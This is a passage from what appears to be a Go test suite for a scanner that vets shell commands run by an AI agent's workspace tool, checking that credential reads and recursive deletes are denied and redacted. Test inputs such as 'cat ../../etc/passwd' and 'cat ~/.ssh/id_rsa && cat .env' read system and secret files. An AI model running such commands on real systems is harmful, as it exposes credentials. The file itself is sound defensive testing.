				Command:  command,
			})
			require.NoError(t, err)
			require.Equal(t, DecisionDeny, report.Decision)
			require.Equal(t, "path.sensitive_credentials", report.RuleID)
			require.True(t, report.Redacted)
		}
	})

	t.Run("cwd traversal is normalized before matching denied paths", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "cat ../../etc/passwd",
			Cwd:      "/tmp/work",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "path.sensitive_credentials", report.RuleID)
		require.True(t, report.Redacted)
	})

	t.Run("report redaction covers normalized equivalent spellings", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "cat /etc/./passwd && cat /etc//passwd",
		})
		require.NoError(t, err)
		require.True(t, report.Redacted)
		require.NotContains(t, report.Command, "/etc/./passwd")
		require.NotContains(t, report.Command, "/etc//passwd")
		require.NotContains(t, report.Command, "/etc/passwd")
		require.NotContains(t, report.Evidence, "/etc/./passwd")
		require.NotContains(t, report.Evidence, "/etc//passwd")
		require.NotContains(t, report.Evidence, "/etc/passwd")
	})
}

func TestDefaultScanner_HelperEdges(t *testing.T) {
	require.False(t, deleteTargetIsSystemPath(""))
	require.False(t, deleteTargetIsSystemPath("-f"))
	require.True(t, deleteTargetIsSystemPath("."))
	require.True(t, deleteTargetIsSystemPath(".."))
	require.True(t, deleteTargetIsSystemPath("~/tmp"))
	require.True(t, deleteTargetIsSystemPath("/tmp/x"))
	require.True(t, deleteTargetIsSystemPath(`C:\Windows`))
	require.False(t, deleteTargetIsSystemPath("build/output.o"))
	require.True(t, deleteFlagIsRecursive("-r"))
	require.True(t, deleteFlagIsRecursive("-rf"))
	require.True(t, deleteFlagIsRecursive("-fr"))
	require.True(t, deleteFlagIsRecursive("--recursive"))
	require.False(t, deleteFlagIsRecursive("--force"))
	require.False(t, deleteFlagIsRecursive("--verbose"))
	require.False(t, deleteFlagIsRecursive("-force"))

	n, ok := parseSleepSeconds("2d")
	require.True(t, ok)
	require.Equal(t, 172800, n)
	n, ok = parseSleepSeconds("1500ms")
	require.True(t, ok)
	require.Equal(t, 1, n)
	_, ok = parseSleepSeconds("")
	require.False(t, ok)
	_, ok = parseSleepSeconds("bad")
	require.False(t, ok)
	require.True(t, isDependencyInstall("python", []string{"python", "-m", "pip", "install", "pkg"}))
	require.True(t, isDependencyInstall("npm", []string{"npm", "--silent", "install", "pkg"}))
	require.False(t, isDependencyInstall("npm", []string{"npm", "config", "get", "install"}))

	require.True(t, sensitivePathMatch("foo/.ssh/id_ed25519", "~/.ssh"))
	require.True(t, sensitivePathMatch("/etc/./passwd", "/etc/passwd"))
	require.True(t, sensitivePathMatch("/etc//passwd", "/etc/passwd"))
	require.False(t, sensitivePathMatch("", "~/.ssh"))
	require.Equal(t, "plain", redactSensitivePath("plain", ""))
	require.Equal(t, "<redacted>/id_rsa", redactSensitivePath("C:/Users/me/.ssh/id_rsa", `C:\Users\me\.ssh`))
	require.Equal(t, "cat <redacted>", redactSensitivePath("cat /etc/./passwd", "/etc/passwd"))
}

func TestDefaultScanner_RedactsReportCommandAndEvidence(t *testing.T) {
	scanner := MustDefaultScanner(Policy{})
	report, err := scanner.Scan(context.Background(), ScanRequest{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspace,
		Command:  "cat ~/.ssh/id_rsa && cat .env",
	})
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	require.True(t, report.Redacted)
	require.NotContains(t, report.Command, "~/.ssh")
	require.NotContains(t, report.Command, "id_rsa")
	require.NotContains(t, report.Command, ".env")
	require.NotContains(t, report.Evidence, "~/.ssh")
	require.NotContains(t, report.Evidence, "id_rsa")
	require.NotContains(t, report.Evidence, ".env")
}

func TestDefaultScanner_SafeSampleFalsePositiveRate(t *testing.T) {
	scanner := MustDefaultScanner(Policy{
		NetworkAllowlist: []string{"proxy.golang.org", ".golang.org"},
	})
	safeCommands := []string{
		"go test ./...",
		"go test ./tool/safety",
		"go list ./...",
		"echo ok",
		"printf hello",
		"pwd",
		"ls -la",
		"cat README.md",
		"grep agent README.md",
		"wc -l README.md",
	}
	var falsePositives int
	for _, command := range safeCommands {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  command,
		})
		require.NoError(t, err)
		if report.Decision != DecisionAllow {
			falsePositives++
		}
	}
	require.LessOrEqual(t, falsePositives, 1)
}

func TestDefaultScanner_PerformanceSamples(t *testing.T) {
	scanner := MustDefaultScanner(Policy{})
	lines := make([]string, 0, 500)
	segments := make([]string, 0, 500)
	for i := 0; i < 500; i++ {
		lines = append(lines, "echo ok")
		segments = append(segments, "echo ok")
	}
	start := time.Now()
	_, err := scanner.Scan(context.Background(), ScanRequest{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		Language: "bash",
		Code:     strings.Join(lines, "\n"),
	})
	require.NoError(t, err)
	require.LessOrEqual(t, time.Since(start), time.Second)

	start = time.Now()
	_, err = scanner.Scan(context.Background(), ScanRequest{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspace,
		Command:  strings.Join(segments, "; "),
	})
	require.NoError(t, err)
	require.LessOrEqual(t, time.Since(start), time.Second)
}
